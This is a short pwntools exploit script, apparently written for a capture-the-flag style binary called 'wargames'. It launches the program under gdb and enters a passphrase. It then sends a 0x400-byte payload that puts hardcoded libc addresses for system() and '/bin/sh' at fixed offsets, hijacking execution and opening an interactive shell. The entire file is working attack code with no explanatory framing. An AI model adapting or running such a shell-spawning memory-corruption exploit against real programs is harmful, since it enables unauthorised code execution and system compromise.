from pwn import *

bpath = './wargames'
elf = ELF(bpath)

context.binary = elf
#context.log_level = 'debug'

gdbscript = '''
            break *main
            break *play_chess
            shell tmux select-layout main-vertical
            shell tmux swap-pane -U
            continue
            '''

nuclear_code = b'CPE 1704 TKS'
addr_system = p64(0x7ffff7a31420)

libc_base = 0x7ffff79e2000
offset_bin_sh = 0x1b3d88
addr_bin_sh = libc_base + offset_bin_sh
addr_bin_sh = p64(addr_bin_sh)

offset_rax = 504
offset_rdi = 496

exploit_str = flat({0:b'y', offset_rdi: addr_bin_sh, offset_rax: addr_system}, length=0x400)

p = gdb.debug(bpath, gdbscript=gdbscript)

p.sendline(b'y')
p.sendline(b'y')
p.sendline(nuclear_code)
p.sendline(exploit_str)

p.interactive()
